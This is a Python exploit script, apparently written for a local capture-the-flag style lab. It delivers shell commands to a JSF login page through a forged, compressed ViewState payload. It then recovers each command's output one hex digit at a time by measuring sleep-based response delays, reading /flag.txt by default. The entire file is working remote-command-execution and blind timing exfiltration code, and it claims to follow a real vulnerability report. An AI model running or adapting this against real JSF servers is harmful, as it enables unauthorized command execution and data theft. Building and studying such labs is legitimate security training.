#!/usr/bin/env python3
"""
Timing side-channel solver for the JSF ViewState lab - the exfiltration method
of the real report (see ./README.md, "Report-faithful timing mode").

Prerequisite: the lab must run with TIMING_MODE=1 (webroot read-only), so the
file-drop exfil path is unavailable and output can only come back encoded in
the response time.

How it works (same encoding as the real report):
  * the executed command output is converted to hex on the server
  * for probe position P the payload sleeps  N * 0.25 seconds,
    where N is the P-th hex digit (plus a 0.5s in-range marker)
  * the digit is recovered from the HTTP response time minus the baseline

Usage:
  TIMING_MODE=1 docker compose up -d --force-recreate
  python3 timing_solver.py                 # read /flag.txt
  python3 timing_solver.py 'id'
  python3 timing_solver.py 'hostname'
"""

import base64
import gzip
import http.cookiejar
import os
import re
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

TARGET = "http://localhost:8080"
LOGIN = TARGET + "/pages/login.xhtml"
HERE = os.path.dirname(os.path.abspath(__file__))

with open(os.path.join(HERE, "payload.template"), "r") as _fh:
    TEMPLATE = "".join(_fh.read().split())

MARKER = re.compile(rb"__CMD__START.*?__CMD__END", re.S)
STEP = 0.25          # seconds per hex digit, as in the real report
RANGE_MARKER = 0.5   # added when the probe position is inside the output


def build_viewstate(script):
    raw = bytearray(base64.b64decode(TEMPLATE))
    m = MARKER.search(bytes(raw))
    if not m:
        raise SystemExit("[!] payload template is corrupted")
    span = m.end() - m.start()
    if len(script) > span:
        raise SystemExit("[!] probe script too long (%d > %d)" % (len(script), span))
    raw[m.start():m.end()] = script.encode() + b" " * (span - len(script))
    return base64.b64encode(gzip.compress(bytes(raw))).decode()


class Session:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))
        self.opener.open(LOGIN, timeout=15).read()

    def post_script(self, script):
        """Deliver the script as ViewState; return the elapsed seconds."""
        viewstate = build_viewstate(script)
        body = "javax.faces.ViewState=" + urllib.parse.quote(viewstate, safe="") \
               + "&loginForm=loginForm"
        req = urllib.request.Request(
            LOGIN, data=body.encode(),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            method="POST")
        start = time.perf_counter()
        try:
            self.opener.open(req, timeout=120).read()
        except urllib.error.HTTPError:
            pass                      # HTTP 500 after the chain fired: expected
        except Exception as exc:
            raise SystemExit("[!] request failed: %s" % exc)
        return time.perf_counter() - start


def probe_script(command, pos):
    """Sleep digit(pos)*0.25s (+0.5s marker); nothing when pos is past the end."""
    return (
        "V=$( { %s ; } 2>&1 | od -An -tx1 | tr -d ' \\n' ); "
        "L=${#V}; "
        "if [ %d -gt $L ]; then exit 0; fi; "
        "C=$(printf %%s \"$V\" | cut -c %d); "
        "N=$((0x$C)); "
        "sleep %.2f; "
        "i=0; while [ $i -lt $N ]; do sleep %.2f; i=$((i+1)); done"
    ) % (command, pos, pos, RANGE_MARKER, STEP)


def main():
    args = sys.argv[1:]
    command = " ".join(args) if args else "cat /flag.txt"

    sess = Session()
    print("[*] target : %s" % TARGET)
    print("[*] command: %r" % command)

    # --- calibration ------------------------------------------------------
    # baseline: the same probe structure, position far beyond the output, so
    # the command runs but nothing sleeps
    baseline_runs = [sess.post_script(probe_script(command, 999)) for _ in range(5)]
    baseline = statistics.median(baseline_runs)

    sync = sess.post_script("sleep 2")
    skew = sync - baseline - 2.0
    print("[*] baseline %.2fs | +2s probe %.2fs (skew %+.2fs)"
          % (baseline, sync, skew))
    if abs(skew) > 0.5:
        raise SystemExit("[!] timing channel unavailable (skew %.2fs). "
                         "Is the lab running with TIMING_MODE=1, and is the "
                         "payload synchronous (tools/build.sh)?" % skew)

    # --- digit-by-digit extraction ---------------------------------------
    digits = []
    pos = 1
    while True:
        elapsed = sess.post_script(probe_script(command, pos))
        delta = elapsed - baseline
        if delta < 0.25:               # past the end of the output
            break
        n = round((delta - RANGE_MARKER) / STEP)
        n = max(0, min(15, n))
        digits.append("%x" % n)
        if pos % 10 == 0:
            print("[*] %2d digits so far: %s" % (pos, "".join(digits)))
        pos += 1
        if pos > 4096:                 # sanity cap
            break

    hx = "".join(digits)
    print("[*] output: %d hex chars (%d bytes)" % (len(hx), len(hx) // 2))
    if not hx:
        print("[!] no output recovered - the command produced nothing")
        return 1

    data = bytes.fromhex(hx)
    print("=" * 46)
    sys.stdout.write(data.decode("utf-8", "replace"))
    if not data.endswith(b"\n"):
        print()
    print("=" * 46)
    return 0


if __name__ == "__main__":
    sys.exit(main())
